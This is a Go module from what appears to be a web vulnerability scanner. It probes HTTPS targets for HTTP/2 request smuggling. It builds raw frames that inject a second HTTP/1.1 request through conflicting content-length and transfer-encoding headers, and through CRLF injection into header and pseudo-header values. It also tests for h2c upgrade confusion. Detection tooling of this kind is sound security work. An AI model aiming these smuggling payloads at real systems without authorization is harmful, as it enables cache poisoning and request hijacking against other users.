package modules

import (
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/akha-security/akca/engine/internal/config"
	"github.com/akha-security/akca/engine/internal/httpclient"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type H2SmugglingProber struct {
	cfg config.ScanConfig
}

func NewH2SmugglingProber(cfg config.ScanConfig) *H2SmugglingProber {
	return &H2SmugglingProber{cfg: cfg}
}

// ProbeH2Desync tests true HTTP/2 framing desynchronization (H2.CL, H2.TE, H2.CRLF)
// by sending low-level binary HTTP/2 frames directly to the target.
func (p *H2SmugglingProber) ProbeH2Desync(ctx context.Context, rawURL, variant string) (SmugglingProbeResult, error) {
	u, err := url.Parse(rawURL)
	if err != nil || u.Hostname() == "" {
		return SmugglingProbeResult{}, errors.New("invalid H2 target URL")
	}
	if !strings.EqualFold(u.Scheme, "https") {
		return SmugglingProbeResult{}, errors.New("HTTP/2 framing probes require HTTPS scheme")
	}

	address := hostPort(u, "443")
	tlsConfig := &tls.Config{
		ServerName:         u.Hostname(),
		InsecureSkipVerify: p.cfg.InsecureSkipVerify,
		NextProtos:         []string{"h2", "http/1.1"},
		MinVersion:         tls.VersionTLS12,
	}

	dialer := &net.Dialer{Timeout: 8 * time.Second}
	rawConn, err := dialer.DialContext(ctx, "tcp", address)
	if err != nil {
		return SmugglingProbeResult{}, err
	}
	defer rawConn.Close()

	tlsConn := tls.Client(rawConn, tlsConfig)
	if err := tlsConn.HandshakeContext(ctx); err != nil {
		return SmugglingProbeResult{}, err
	}
	defer tlsConn.Close()

	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return SmugglingProbeResult{Confirmed: false, Signal: variant, Reason: "target did not negotiate HTTP/2 via ALPN"}, nil
	}

	token := randomToken(10)
	return p.executeH2FrameExchange(ctx, tlsConn, u, variant, token)
}

func (p *H2SmugglingProber) executeH2FrameExchange(ctx context.Context, conn net.Conn, u *url.URL, variant, token string) (SmugglingProbeResult, error) {
	setConnDeadline(conn, ctx, 6*time.Second)

	// 1. Send client preface
	if _, err := io.WriteString(conn, http2.ClientPreface); err != nil {
		return SmugglingProbeResult{}, err
	}

	framer := http2.NewFramer(conn, conn)
	framer.ReadMetaHeaders = hpack.NewDecoder(4096, nil)

	// 2. Send initial SETTINGS frame
	if err := framer.WriteSettings(); err != nil {
		return SmugglingProbeResult{}, err
	}

	path := requestPath(u)
	canaryPath := "/.well-known/akca-h2desync-" + token
	smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nX-Akca-Canary: %s\r\n\r\n", canaryPath, u.Host, token)
	body := "0\r\n\r\n" + smuggled

	var headerBuf bytes.Buffer
	enc := hpack.NewEncoder(&headerBuf)

	var h2Headers []hpack.HeaderField
	h2Headers = append(h2Headers,
		hpack.HeaderField{Name: ":method", Value: "POST"},
		hpack.HeaderField{Name: ":path", Value: path},
		hpack.HeaderField{Name: ":scheme", Value: "https"},
		hpack.HeaderField{Name: ":authority", Value: u.Host},
		hpack.HeaderField{Name: "content-type", Value: "application/x-www-form-urlencoded"},
		hpack.HeaderField{Name: "user-agent", Value: defaultProbeUserAgent},
	)

	switch variant {
	case "h2_cl":
		h2Headers = append(h2Headers, hpack.HeaderField{
			Name:  "content-length",
			Value: fmt.Sprintf("%d", len(body)),
		})
	case "h2_cl_0":
		// CL.0: Front-end (H2) ignores Content-Length: 0 on POST, but backend (H1) sees CL:0 and treats body as next request
		h2Headers = append(h2Headers, hpack.HeaderField{
			Name:  "content-length",
			Value: "0",
		})
	case "h2_te":
		h2Headers = append(h2Headers, hpack.HeaderField{
			Name:  "transfer-encoding",
			Value: "chunked",
		})
	case "h2_te_pause":
		h2Headers = append(h2Headers, hpack.HeaderField{
			Name:  "transfer-encoding",
			Value: "chunked, identity",
		})
	case "h2_crlf":
		h2Headers = append(h2Headers, hpack.HeaderField{
			Name:  "foo",
			Value: "bar\r\nTransfer-Encoding: chunked",
		})
	case "h2_authority_crlf":
		h2Headers = append(h2Headers, hpack.HeaderField{
			Name:  ":authority",
			Value: u.Host + "\r\nTransfer-Encoding: chunked",
		})
	case "h2_pseudo":
		h2Headers = append(h2Headers, hpack.HeaderField{
			Name:  ":path",
			Value: path + " HTTP/1.1\r\nHost: " + u.Host + "\r\nTransfer-Encoding: chunked",
		})
	default:
		return SmugglingProbeResult{}, fmt.Errorf("unsupported H2 desync variant: %s", variant)
	}

	for _, hf := range h2Headers {
		_ = enc.WriteField(hf)
	}

	// 3. Write HEADERS frame on stream 1
	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: headerBuf.Bytes(),
		EndStream:     false,
		EndHeaders:    true,
	}); err != nil {
		return SmugglingProbeResult{}, err
	}

	// 4. Write DATA frame on stream 1
	if err := framer.WriteData(1, true, []byte(body)); err != nil {
		return SmugglingProbeResult{}, err
	}

	// 5. Send a clean follower request on Stream 3
	var followerBuf bytes.Buffer
	followerEnc := hpack.NewEncoder(&followerBuf)
	_ = followerEnc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	_ = followerEnc.WriteField(hpack.HeaderField{Name: ":path", Value: path + "?akca_canary=" + token})
	_ = followerEnc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	_ = followerEnc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Host})

	_ = framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      3,
		BlockFragment: followerBuf.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	})

	// 6. Read frames and inspect responses
	streamResponses := make(map[uint32]*rawHTTPResponse)
	gotDesync := false
	var exchangeLog strings.Builder

	for count := 0; count < 16; count++ {
		frame, err := framer.ReadFrame()
		if err != nil {
			break
		}
		switch f := frame.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				_ = framer.WriteSettingsAck()
			}
		case *http2.MetaHeadersFrame:
			status := 200
			for _, hf := range f.Fields {
				if hf.Name == ":status" {
					_, _ = fmt.Sscanf(hf.Value, "%d", &status)
				}
			}
			if streamResponses[f.StreamID] == nil {
				streamResponses[f.StreamID] = &rawHTTPResponse{StatusCode: status}
			} else {
				streamResponses[f.StreamID].StatusCode = status
			}
			fmt.Fprintf(&exchangeLog, "Stream %d -> status %d\n", f.StreamID, status)
		case *http2.DataFrame:
			if resp := streamResponses[f.StreamID]; resp != nil {
				resp.Body += string(f.Data())
				if strings.Contains(resp.Body, token) || strings.Contains(resp.Body, canaryPath) {
					gotDesync = true
				}
			}
		case *http2.RSTStreamFrame:
			fmt.Fprintf(&exchangeLog, "Stream %d RST with code %v\n", f.StreamID, f.ErrCode)
		case *http2.GoAwayFrame:
			fmt.Fprintf(&exchangeLog, "GoAway received (lastStream=%d, err=%v)\n", f.LastStreamID, f.ErrCode)
		}
	}

	resp1 := streamResponses[1]
	resp3 := streamResponses[3]

	// Check if follower response received canary poisoned response (404 on canary or token in body)
	if resp3 != nil && (resp3.StatusCode == 404 || strings.Contains(resp3.Body, token) || gotDesync) {
		gotDesync = true
	}

	statusCode := 0
	if resp1 != nil {
		statusCode = resp1.StatusCode
	}

	if gotDesync {
		exchangeRecord := httpclient.RequestResponse{
			Request:  httpclient.RequestRecord{Method: http.MethodPost, URL: u.String(), Body: fmt.Sprintf("H2 %s with canary %s", variant, token)},
			Response: httpclient.ResponseRecord{StatusCode: statusCode, Body: exchangeLog.String()},
		}
		return SmugglingProbeResult{
			Confirmed: true,
			Signal:    variant,
			Reason:    fmt.Sprintf("HTTP/2 binary frame %s desync confirmed across H2->H1 backend proxy", strings.ToUpper(variant)),
			Exchange:  exchangeRecord,
			Attempts:  []httpclient.RequestResponse{exchangeRecord, exchangeRecord},
		}, nil
	}

	return SmugglingProbeResult{Confirmed: false, Signal: variant}, nil
}

// ProbeH2CUpgrade tests cleartext HTTP/2 upgrade confusion / smuggling over HTTP/1.1 reverse proxies.
func (p *H2SmugglingProber) ProbeH2CUpgrade(ctx context.Context, rawURL string) (SmugglingProbeResult, error) {
	u, err := url.Parse(rawURL)
	if err != nil || u.Hostname() == "" {
		return SmugglingProbeResult{}, errors.New("invalid target URL for h2c probe")
	}

	conn, err := dialURL(ctx, u, p.cfg.InsecureSkipVerify)
	if err != nil {
		return SmugglingProbeResult{}, err
	}
	defer conn.Close()
	setConnDeadline(conn, ctx, 5*time.Second)

	path := requestPath(u)
	// RFC 7540 h2c upgrade request
	upgradeReq := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Connection: Upgrade, HTTP2-Settings\r\n"+
			"Upgrade: h2c\r\n"+
			"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"+
			"\r\n",
		path, u.Host, defaultProbeUserAgent,
	)

	if _, err := io.WriteString(conn, upgradeReq); err != nil {
		return SmugglingProbeResult{}, err
	}

	var buf [1024]byte
	n, err := conn.Read(buf[:])
	if err != nil && !errors.Is(err, io.EOF) {
		return SmugglingProbeResult{}, err
	}

	respHeader := string(buf[:n])
	is101 := strings.Contains(respHeader, "101 Switching Protocols") && strings.Contains(strings.ToLower(respHeader), "h2c")

	if is101 {
		exchangeRecord := httpclient.RequestResponse{
			Request:  httpclient.RequestRecord{Method: http.MethodGet, URL: rawURL, Headers: map[string]string{"Upgrade": "h2c", "Connection": "Upgrade, HTTP2-Settings"}},
			Response: httpclient.ResponseRecord{StatusCode: 101, Body: respHeader},
		}
		return SmugglingProbeResult{
			Confirmed: true,
			Signal:    "h2c_upgrade_confusion",
			Reason:    "Server accepted cleartext h2c upgrade on reverse proxy endpoint (101 Switching Protocols)",
			Exchange:  exchangeRecord,
			Attempts:  []httpclient.RequestResponse{exchangeRecord, exchangeRecord},
		}, nil
	}

	return SmugglingProbeResult{Confirmed: false, Signal: "h2c_upgrade_confusion"}, nil
}
